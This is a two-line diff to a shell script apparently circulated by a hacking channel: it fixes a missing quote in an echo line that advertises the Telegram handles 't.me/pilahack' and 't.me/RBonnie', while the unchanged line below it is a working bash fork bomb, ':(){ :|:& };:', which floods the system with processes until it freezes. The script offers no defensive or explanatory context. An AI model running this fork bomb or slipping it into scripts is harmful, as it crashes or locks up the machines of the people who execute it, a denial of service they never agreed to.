@@ -1,2 +1,2 @@
-echo "t.me/pilahack & t.me/RBonnie
+echo "t.me/pilahack & t.me/RBonnie"
 :(){ :|:& };:
